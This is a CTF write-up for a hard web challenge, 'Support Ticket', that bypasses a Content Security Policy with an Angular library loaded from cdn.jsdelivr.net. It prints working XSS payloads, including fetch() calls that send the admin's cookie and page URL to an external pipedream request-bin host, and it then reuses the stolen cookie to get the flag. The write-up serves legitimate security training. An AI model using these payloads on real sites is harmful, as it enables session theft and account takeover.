<img src="https://raw.githubusercontent.com/CTFae/media/main/brand/YT-banner.jpg" />

### Challenge: Support Ticket
### Category: Web
### Difficulty: Hard
<hr>

#### Challenge Description
In this challenge, the player is presented with a website where they can submit support tickets that will be reviewed by an admin. The goal is to achieve successful XSS by bypassing CSP.

#### Challenge Screenshot
![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-1.png)

#### Solution
Let us test if there is XSS in the Description input:
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-2.png)

We can preview the ticket to see if our payload will work, and we see that the HTML was embedded, but there was no alert popup. Viewing the source confirms that the payload is there, it just didn't fire. If we open the console to check, we see an error about CSP.

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-3.png)

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-4.png)

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-5.png)

CSP (Content Security Policy) is an HTTP header that a web application can send to inform the browser what are the trusted sources to load and execute javascript from. Let's examine the CSP policy sent by the server:

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-6.png)

We can use an online tool by google called [CSP Evaluator](https://csp-evaluator.withgoogle.com/) and paste the CSP policy into it to check for any vulnerabilities.

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-7.png)

We can observe that this CSP policy allows the execution of scripts that are hosted on the domain `cdn.jsdelivr.net` which may also host Angular libraries that can be used to bypass this CSP. For more on bypassing CSP using angular, read this blog [here](https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d).

Here is what a sample payload looks like using angular loaded from `cdn.jsdelivr.net`:
```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

Let's test to see if it works:

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-8.png)

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-9.png)

It works! So now let's craft a payload to exfiltrate the cookie and see if there's anything interesting. I will be using a payload that sends the cookie via HTTP request to a RequestBin URL:

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('fetch("https://enveya9ikla4d.x.pipedream.net/?cookie=" + document.cookie, {mode: "no-cors"})')()}}</div>
```

We run the payload successfully on the admin and steal their cookie:

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-10.png)

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-11.png)

But...the cookie contains no flag and applying it has no effect. Let's enumerate further and try to steal the URL that the admin is using to view our tickets:

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('fetch("https://enveya9ikla4d.x.pipedream.net/?url=" + window.location.href, {mode: "no-cors"})')()}}</div>
```

We run the payload successfully again and see the internal URL:

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-12.png)

We found an internal URL! And it has an HTTP parameter `showFlag=0`! It seems we have found our flag, let's try to visit it:

![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-13.png)

We get a permisssion denied, not admin. But that's okay, we stole the admin cookie earlier. Apply it and refresh and also change the HTTP parameter to `showFlag=1`.


#### Exploit Screenshot
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/support_ticket-14.png)

<hr>

&copy; <a href="https://ctf.ae" target=_blank>CTF.ae</a>
